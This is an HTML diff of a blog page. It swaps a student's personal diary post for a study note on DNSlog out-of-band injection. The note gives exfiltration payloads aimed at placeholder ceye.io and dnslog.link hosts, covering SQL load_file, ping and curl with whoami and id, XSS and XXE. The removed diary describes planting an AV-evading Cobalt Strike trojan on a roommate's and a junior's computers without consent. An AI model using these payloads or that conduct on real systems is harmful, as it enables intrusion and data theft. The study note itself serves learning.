@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='茄子在养茄子'><title>茄科生物观测日志</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='DNSlog注入学习 前置 域名分级与域名解析过程(DNS) 读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务'><title>DNSlog注入</title>
 
-<link rel='canonical' href='https://proben1.github.io/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97/'>
+<link rel='canonical' href='https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/'>
 
-<link rel="stylesheet" href="/scss/style.min.9b1fc3b09cf11c2391a1bb047fd93317cd0f3be091b6c8d36d221829af5af94d.css"><meta property='og:title' content='茄科生物观测日志'>
-<meta property='og:description' content='茄子在养茄子'>
-<meta property='og:url' content='https://proben1.github.io/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97/'>
+<link rel="stylesheet" href="/scss/style.min.9b1fc3b09cf11c2391a1bb047fd93317cd0f3be091b6c8d36d221829af5af94d.css"><meta property='og:title' content='DNSlog注入'>
+<meta property='og:description' content='DNSlog注入学习 前置 域名分级与域名解析过程(DNS) 读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务'>
+<meta property='og:url' content='https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/'>
 <meta property='og:site_name' content='茄子的养殖场'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='' /><meta property='article:tag' content='' /><meta property='article:published_time' content='2021-12-06T12:08:35&#43;08:00'/><meta property='article:modified_time' content='2021-12-06T12:08:35&#43;08:00'/>
-<meta name="twitter:title" content="茄科生物观测日志">
-<meta name="twitter:description" content="茄子在养茄子"><style>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web安全' /><meta property='article:tag' content='' /><meta property='article:published_time' content='2022-05-17T21:55:19&#43;08:00'/><meta property='article:modified_time' content='2022-05-17T21:55:19&#43;08:00'/>
+<meta name="twitter:title" content="DNSlog注入">
+<meta name="twitter:description" content="DNSlog注入学习 前置 域名分级与域名解析过程(DNS) 读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务"><style>
     :root {
         --article-font-family: "Noto Serif SC", var(--base-font-family);
     }
@@ -262,21 +262,17 @@
     
     <header class="article-category">
         
-            <a href="/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/" style="background-color: #2a9d8f; color: #fff;">
-                小人联合工会内部资料
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
             </a>
         
     </header>
     
 
     <h2 class="article-title">
-        <a href="/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97/">茄科生物观测日志</a>
+        <a href="/2022/dnslog%E6%B3%A8%E5%85%A5/">DNSlog注入</a>
     </h2>
 
-    
-    <h3 class="article-subtitle">
-        茄子在养茄子
-    </h3>
     
 
     
@@ -292,7 +288,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Dec 06, 2021</time>
+                <time class="article-time--published">May 17, 2022</time>
             </div>
         
 
@@ -307,7 +303,7 @@
 
 
                 <time class="article-words">
-                    2579字
+                    679字
                 </time>
             </div>
         
@@ -319,68 +315,15 @@
     <section class="article-content">
     
     
-    <h3 id="2022-5-12">2022-5-12</h3>
-<p>今天捣鼓了一天的博客，互联网是在是太精彩啦！</p>
-<p>在经过重重深思之后，我仍然无法决定观察日记是要写成这种小作文的形式还是写成每天流水账的形式，觉得，可以浅浅结合一下。</p>
-<p>快乐的月中总结，这里首先点名批评csgo，csgo做错了什么？在我疯狂的，放手一搏的，镇定自若的rushB，抢A大以及野牛干拉之后，我决定冷落这个csgo，恩，还有我帅气的AK火神。然后是身为罗德岛博士的反思，艾丽妮又做错了什么？连着投递五次入职书，她爱你啊！你却还执意偏爱鲨鲨，最终只是，徒劳的，200抽。</p>
-<p>从没发现自己这么会做ppt，情不自禁展示一下：</p>
-<img src="https://pic.imgdb.cn/item/627d093e0947543129eb2b7f.jpg" width="40%" height="40%"/>
-<p>最后竟然被打回了，改成了一个淡色的版本，这里又情不自禁展示一下：</p>
-<img src="https://pic.imgdb.cn/item/627d09a20947543129ecaf53.jpg" width="40%" height="40%"/>
-<p>管理学签到，老师先发了个签到码，四位，我一猜是今天日期，直接一个0512上去，在路上就解决了签到问题，完美。遂逃课。然老师点名，寄，还说我咋签的这么快。</p>
-<h3 id="2022-4-13">2022-4-13</h3>
-<p>蛮快的，22年过三分之一了，看到四个月前的期末复习感觉自己像个傻子一样。拖，就硬拖，人现在还在等信号成绩。
-在电脑上记的时候比较少，但是看起来存在感比较高，我以后可能会慢慢把手机上的转到电脑上。</p>
-<p>想想从疫情连夜逃回大连之后都发生了啥。</p>
-<p>1.吃火锅得到教训，不要把娃娃菜放到辣锅里去吃。</p>
-<p>2.查了四级成绩&hellip;570，然后准备六级。</p>
-<p>3.一遍过了科二&hellip;100，教练老开心了。刷完了科三学时，在路上跑现在应该没问题，下个假期驾照就差不多了。</p>
-<p>4.游戏方面。。。悟到了一个真理啊，<em>游戏只是想要的生活中很容易得到的一部分</em>。假期是经典的五黑和csgo无缝切换。星际拓荒很棒。</p>
-<p>5.拜年纪的《弈》，《再会江湖》，《流年如歌》，《另一个我》，《海盗船》。</p>
-<p>6.学会做饭，现在在疯狂点名家常菜。</p>
-<p>7.回了躺姥姥家，撸羊。</p>
-<p>开学，封校期间</p>
-<p>1.艾尔登法环。白金。神评了。</p>
-<p>2.hvv的面试，暂且称之为一面吧，但是我对今年能不能去hvv持担忧态度。</p>
-<p>3.做到了隐瞒一件事情，理性战胜了感性。</p>
-<p>4.看计网。。。</p>
-<p>期末考试开放期间</p>
-<p>1.看了《认知觉醒》。收获很大，特别是学会了冥想等。</p>
-<p>2..期末考试，先考了信号，然后清明假期啥都没干硬生生复习了三天，之后把模电，大物，概率论这些考了。重点来了，五科中的四科都感觉要挂，遂等成绩，然而成绩一直没出，直到今日，还差模电和信号。</p>
-<p>3.和科科去了翠华山，开局选了最难的一条道，爬完之后在风洞冰洞零下直接腿抽筋。不过风景还是很不错的。来回是黑车司机接送，可能是长安区最会说话的黑车司机了。。。什么两手抓两手都要硬，学习恋爱两不误，最后还把我微信推给同车姑娘的寝室群里去了hhh。</p>
-<p>4.为了复习类用coo写了个中国象棋，最后发现自己的归宿可能是去做万宁象棋的开发，后面想用pygame真的搞个万宁象棋hhhh。</p>
-<p>5.为了复现一些java的框架漏洞而开始学java 。</p>
-<p>6.和zc同学唠嗑，开始！</p>
-<p>不管咋说，最后又回到提升阶段了。假期的时候还是蛮丧的，现在真的看开了不少。</p>
-<h3 id="2021的一些关键词后半年才记的">2021的一些关键词（后半年才记的）</h3>
-<p>音乐《孤勇者》（12月）、《Abandon Ship》、明日方舟音律联觉（4月）、《呼吸之野》（5月）、《时光盲盒》（春节）</p>
-<p>电视剧《毛》（12月）、《双城之战》（11月）</p>
-<p>游戏《Borderlands3》（12月）、《钢铁雄心4》（12月）、《Subnautica》（10月）、《空洞骑士》（7月）、《晶体管》（6月）、星际争霸人族战役残酷（9月）、</p>
-<p>小说《死在火星上》（10月）</p>
-<h3 id="2021-12-17">2021-12-17</h3>
-<p>近期复习期末…………很麻</p>
-<p>期末期间学习任务安排：</p>
-<p>1.思想建设学习（贼上头）</p>
-<p>马克思主义，毛泽东思想</p>
-<p>2.英语学习（摸）</p>
-<p>英语书籍阅读</p>
-<p>3.计网</p>
-<p>4.渗透测试</p>
-<p>娱乐安排：从零到一的狼王成长之路（这里是后记，他还是不会狼人杀）、象棋、zuo球……还有什么铺地毯</p>
-<h3 id="2021-12-08">2021-12-08</h3>
-<p>睡觉前听模电课很明显比睡觉前刷手机cool，也更助眠……摸了一天模电……</p>
-<p>重保投了简历很明显人家没鸟我……</p>
-<p>昨天刷了某人的600个知乎回答，有了重塑三观的想法……这也侧面说明我的观念体系很脆弱（可能从小学修修补补用到现在？），这学期技术进步一般，总体来说但比上学期多；重点是其他的变化（才不是身子233），预计期末和假期会把精神世界重塑一遍（毛选，马原），就这样……</p>
-<p>来了俩新舍友，通工第一和第二……第一天就展示了“卷”字咋写，都上床了就你们还在学是吧？直接被阿杜骂到床上了（真·偷乐）。</p>
-<h3 id="2021-12-05">2021-12-05</h3>
-<p>记在了6号上面，因为是六号写的……</p>
-<p>在网协睡，没睡好，软协那边学弟定的5点闹钟，一直响到7点都没把他叫醒。吃个豆腐脑然后回宿舍，舍友没醒没人开门，在门外找了个CS免杀马的教程，照着试一下，结果真可以！第一位受害者遂成给我开门的舍友。</p>
-<p>中午睡了会，做了一个巨酷炫的梦。</p>
-<p>最好玩的地方来了。晚上，学弟在语雀里明确表示受到小风的欺压（X），于是小风向我要了免杀马并发给他。</p>
+    <h1 id="dnslog注入学习">DNSlog注入学习</h1>
+<h3 id="前置">前置</h3>
+<p><a class="link" href="https://blog.csdn.net/m0_37263637/article/details/85157611"  target="_blank" rel="noopener"
+    >域名分级与域名解析过程(DNS)</a></p>
+<p>读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务器帮你去迭代查询。</p>
 <p><figure 
 	>
-	<a href="https://pic.imgdb.cn/item/6240212f27f86abb2a8ed125.png" >
-		<img src="https://pic.imgdb.cn/item/6240212f27f86abb2a8ed125.png"
+	<a href="https://pic.imgdb.cn/item/62839ec50947543129b13f5b.jpg" >
+		<img src="https://pic.imgdb.cn/item/62839ec50947543129b13f5b.jpg"
 			
 			
 			
@@ -389,16 +332,72 @@
 	</a>
 	
 </figure></p>
-<p>附：网易云破解版。</p>
-<p>人家还真就点开了，于是成功上线cs……把大一时写的鼠标抖动.exe传上去执行，顺便屏幕截图，发现学弟当时正在搜网易云破解版是啥hhh。我俩去124看情况，正好赶上鼠标开始鬼畜……一顿忙乎给清干净了。自己作（zuo，三声）的祸害得自己清理干净。</p>
-<p>晚上回宿舍朱朱将了一堆关于恋爱的感悟，emmm，可能吧，有些人看似没对象是在第一层，但实际上他也在第三层。没错，我现在已经在第三层了！</p>
-<h3 id="2021-12-06">2021-12-06</h3>
-<p>本来不想在中午记的，这东西还是晚上记合适。起因是学弟想看看博客，我寻思着就把豪哥的小作文推给他，结果没忍住自己看起来了，看着看着就如同身临其境，然后就emo了。</p>
-<p>之前一直是写的日记，嗯，纸质的那种，大一上写，大一下没写，这学期又捡起来了，再想自己的字可能文字识别也识别不出来，不如索性搁网上一弄，有些笑话大家都能看了，还能自己留个成长轨迹，以后想在现实里看大不了再打印嘛……</p>
-<p>上午溜了大物课，整理整理生活，还能剩下时间学模电，结果就一直在”喝茶——整理博客——上厕所——晒太阳“中无限循环，正好期末来了，难度“四级&lt;=概率论&lt;大物&lt;信号&lt;模电”，该收收心好好学学别挂科了，但是又想做题……只能妥协一下，每天就一道题吧，点到为止hhh。</p>
-<p>最近是没时间玩游戏了，亏我还买了大表哥，无主之地，蔚蓝，还给龙脉唱歌加了愿望单，幸运的话大四之前可以全玩完？呜呜呜！</p>
-<p>好好学习！打游戏可以再造个自己去玩？</p>
-<p>（昨天素材太好了，忍不住记一下，详见2021-12-05）</p>
+<p>其中，红色部分是可控的。我们只需要弄一个红色部分的DNS服务器，就得到DNS的解析日志。</p>
+<p>红色部分哪里来？自己搭建去（不一定），可以用下面的网站。</p>
+<h3 id="网站">网站</h3>
+<p><a class="link" href="http://www.dnslog.cn/"  target="_blank" rel="noopener"
+    >http://www.dnslog.cn/</a></p>
+<p><a class="link" href="http://ceye.io/"  target="_blank" rel="noopener"
+    >http://ceye.io/</a></p>
+<h3 id="原理">原理</h3>
+<p><a class="link" href="https://www.cnblogs.com/Xy--1/p/12896599.html"  target="_blank" rel="noopener"
+    >DNS注入</a></p>
+<p>上面这些讲的很清楚，这里再用自己的话总结一下，就以Sql的利用为例子：</p>
+<p>在权限（文件可读）、环境（secure_file_priv）、长度（max_allowed_packet）都满足的情况下，在通过LOAD-FILE等文件函数进行读写时，整了个UCN路径，UCN路径构建DNS服务器地址，假装访问文件，产生DNSlog，就是这个DNSlog可以夹带私货，比如</p>
+
+
+
+<div class="notice notice-tip" >
+    <div class="notice-title"><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>select load_file(concat(&rsquo;\\&rsquo;,(select database()),&rsquo;.xxxx.ceye.io\abc&rsquo;))</p></div>
+
+<p>UNC路径的理解（Universal Naming Convention）</p>
+<p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/627e4754094754312924bd43.jpg" >
+		<img src="https://pic.imgdb.cn/item/627e4754094754312924bd43.jpg"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="利用">利用</h3>
+<p><a class="link" href="https://www.freebuf.com/column/184587.html"  target="_blank" rel="noopener"
+    >使用DNSLOG拯救你的盲打盲注</a></p>
+<p><a class="link" href="http://www.admintony.com/DNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html"  target="_blank" rel="noopener"
+    >DNSLog在渗透中的使用</a></p>
+<h4 id="1sql注入中的盲注">1.SQL注入中的盲注</h4>
+<h4 id="2无回显的命令执行">2.无回显的命令执行</h4>
+<p><strong>Linux</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> ping <span style="color:#f1fa8c">`</span>whoami<span style="color:#f1fa8c">`</span>.xxxx.ceye.io
+</span></span><span style="display:flex;"><span> curl http://haha.xxx.ceye.io/<span style="color:#f1fa8c">`</span>whoami<span style="color:#f1fa8c">`</span>
+</span></span></code></pre></div><p>像这里还有复杂点的，base64，多行输出等等</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl http://xxx.dnslog.link/<span style="color:#ff79c6">$(</span>id|base64|tr <span style="color:#f1fa8c">&#39;\n&#39;</span> <span style="color:#f1fa8c">&#39;-&#39;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i in <span style="color:#ff79c6">$(</span>ls /<span style="color:#ff79c6">)</span>;<span style="color:#ff79c6">do</span> curl <span style="color:#f1fa8c">&#34;http://</span><span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#f1fa8c">.xxx.dnslog.link/&#34;</span>;<span style="color:#ff79c6">done</span>;
+</span></span></code></pre></div><p><strong>Windows</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>ping <span style="color:#8be9fd;font-style:italic">%USERNAME%</span>.xxx.ceye.io
+</span></span></code></pre></div><p>这里也有复杂点的，其实都是配合命令行来</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>获取计算机名：for /F <span style="color:#f1fa8c">&#34;delims=\&#34;</span> <span style="color:#8be9fd;font-style:italic">%i in (&#39;whoami&#39;) do ping -n 1 %</span>i.xxx.dnslog.link
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>获取用户名：for /F <span style="color:#f1fa8c">&#34;delims=\ tokens=2&#34;</span> <span style="color:#8be9fd;font-style:italic">%i in (&#39;whoami&#39;) do ping -n 1 %</span>i.xxx.dnslog.link
+</span></span></code></pre></div><h4 id="3无回显ssrf">3.无回显SSRF</h4>
+<p>基本是把url换成想要的SSRF.xxxx.ceye.io</p>
+<h4 id="4xss跨站">4.XSS跨站</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span>http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//XSS.XXXXX.ceye.io&gt;&lt;/script&gt;
+</span></span></span></code></pre></div><h4 id="5xxe">5.XXE</h4>
+<p>改dtd：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!ENTITY</span> % all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&lt;!ENTITY % send SYSTEM &#39;http://xxxx.ceye.io/%file;&#39;&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>%all;
+</span></span></code></pre></div><h3 id="tips">Tips</h3>
+<p>**为什么要使用DNS注入？**同学面试的时候被问过，原话是：除了上述这些（报错，盲注等）注入，sql注入有没有啥快速跑出来的方法？</p>
+<p>盲注跑数据太慢的情况下，可以选择<strong>DNS</strong>注入。</p>
 
 </section>
 
@@ -406,6 +405,8 @@
     <footer class="article-footer">
     
     <section class="article-tags">
+        
+            <a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
         
     </section>
 
@@ -437,18 +438,6 @@
                 
                     
 <article class="">
-    <a href="/2022/dnslog%E6%B3%A8%E5%85%A5/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">DNSlog注入</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
     <a href="/2022/%E5%AE%89%E6%B4%B5%E6%9D%AF2019iamthinking/">
         
         
@@ -471,56 +460,24 @@
     </a>
 </article>
                 
+                    
+<article class="">
+    <a href="/2022/%E6%AD%A3%E5%88%99%E4%B8%8Epcre%E5%9B%9E%E6%BA%AF/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">正则与PCRE回溯</h2>
+        </div>
+    </a>
+</article>
+                
             </div>
         </div>
     
 </aside>
 
      
-     
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
-<script type="application/javascript">
-    window.disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "stack" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (DISQUS) {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
     
 
     <footer class="site-footer">
@@ -761,13 +718,19 @@ document.getElementById('days').innerHTML = number_of_days;
   <ol>
     <li>
       <ol>
-        <li><a href="#2022-5-12">2022-5-12</a></li>
-        <li><a href="#2022-4-13">2022-4-13</a></li>
-        <li><a href="#2021的一些关键词后半年才记的">2021的一些关键词（后半年才记的）</a></li>
-        <li><a href="#2021-12-17">2021-12-17</a></li>
-        <li><a href="#2021-12-08">2021-12-08</a></li>
-        <li><a href="#2021-12-05">2021-12-05</a></li>
-        <li><a href="#2021-12-06">2021-12-06</a></li>
+        <li><a href="#前置">前置</a></li>
+        <li><a href="#网站">网站</a></li>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#利用">利用</a>
+          <ol>
+            <li><a href="#1sql注入中的盲注">1.SQL注入中的盲注</a></li>
+            <li><a href="#2无回显的命令执行">2.无回显的命令执行</a></li>
+            <li><a href="#3无回显ssrf">3.无回显SSRF</a></li>
+            <li><a href="#4xss跨站">4.XSS跨站</a></li>
+            <li><a href="#5xxe">5.XXE</a></li>
+          </ol>
+        </li>
+        <li><a href="#tips">Tips</a></li>
       </ol>
     </li>
   </ol>
